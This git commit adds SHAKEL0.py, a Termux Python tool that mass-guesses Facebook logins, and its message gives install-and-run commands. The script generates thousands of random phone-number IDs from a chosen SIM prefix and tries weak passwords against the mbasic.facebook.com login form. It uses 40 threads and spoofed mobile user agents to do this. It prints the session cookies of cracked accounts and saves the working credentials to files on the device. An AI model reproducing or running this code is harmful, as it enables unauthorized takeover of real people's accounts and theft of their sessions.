0d08a68481c8e7978f129157b9e7cb864c79c773
Mizan <140537699+mizan619@users.noreply.github.com>
2023-10-24 11:47:21 +0600

    Create SHAKEL0.py
    pkg update
    pkg upgrade
    pkg install python
    rm -rf SHAKEL0
    git clone https://github.com/mizan619/SHAKEL0.git
    cd SHAKEL0
    python SHAKEL0.py

---
+++ SHAKEL0.py
@@ -0,0 +1,215 @@
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+P = '\x1b[1;97m' # 
+M = '\033[1;33m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;96m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aSHAKEL=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aSHAKEL)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+os.system("xdg-open https://t.me/fb_crack_termux_all_free_command")
+logo =("""\033[1;32m
+███████╗██╗  ██╗ █████╗ ██╗  ██╗███████╗██╗     
+██╔════╝██║  ██║██╔══██╗██║ ██╔╝██╔════╝██║     
+███████╗███████║███████║█████╔╝ █████╗  ██║     
+╚════██║██╔══██║██╔══██║██╔═██╗ ██╔══╝  ██║     
+███████║██║  ██║██║  ██║██║  ██╗███████╗███████╗
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
+\033[1;32m----------------------------------------------
+[🌺] Author   : SHAKEEL Khan 
+[🌺] Facebook : Shakel Khan
+[🌺] Tool     : FREE
+[🌺] Version  : 1.1
+\033[1;37m----------------------------------------------""")
+
+def SHAKEL():
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/shakelbhai132/')
+    print(logo)
+    print("")
+    print("\033[1;96m [1]: RANDOM CLONE")
+    print("\033[1;36m [2]: Contact on Facebook")
+    print("\033[1;96m [0]: Exit menu")
+    print(" \033[1;36m")
+    print(" \033[1;36m")
+    print("\033[1;36m")
+    print("\033[1;96m")
+    print("")
+    SHAKEL = input(f'\033[1;32m SELECTED YOUR OPTION :\033[1;36m ')
+    if SHAKEL in ["1","A"]:
+        SHAKELs()
+    if SHAKEL in ["2","B"]:
+        os.system('xdg-open')
+    if SHAKEL in ["3","C"]:
+        os.system('xdg-open') 
+    if SHAKEL in ["0","X"]:
+        os.system('exit')
+
+def SHAKELs():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91m")
+    print("\033[1;31m \033[1;36m  YOUR SIM CODE: \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
+    print("\033[1;91m")
+    code = input('\033[1;32m YOUR SIM CODE:\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://facebook.com/groups/1713018672413612/')
+    print(logo)
+    print("\033[1;91m")
+    print("\033[1;31m\033[1;36m  YOUR CRACK LIMIT : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
+    print("\033[1;91m")
+    limit=int(input("\033[1;32m YOUR CRACK LIMIT :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91m----------------------------------------------")
+        print(f'\033[1;92m [√]YOUR SIM CODE : '+code) 
+        print(f'\033[1;92m [√]YOUR TOTAL ID : '+tl)
+        print(f'\033[1;92m [√]PLEASE WAIT CLONING START')
+        print(f'\033[1;92m [√]SUPER FAST SPEED CLONING') 
+        print("\033[1;91m----------------------------------------------""")       
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
+            uid = code+love
+            Fb_crack.submit(SHAKELm,uid,pwx,tl)
+    print("\033[1;91m╔═══════════════════════════╗")
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM SHAKEL ')
+    print("\033[1;91m╚═══════════════════════════╝")
+
+
+def SHAKELm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]✳️[\033[1;92m%s\033[1;91m]👁‍🗨[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority':'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://www.google.com/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"vivo 1820"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"8.1.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro, 
+            'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
+                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
+                open('/sdcard/SHAKEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[ҒᏴ-ᏟᎡᎪᏟᏦ-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
+                open('/sdcard/SHAKEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+SHAKEL()
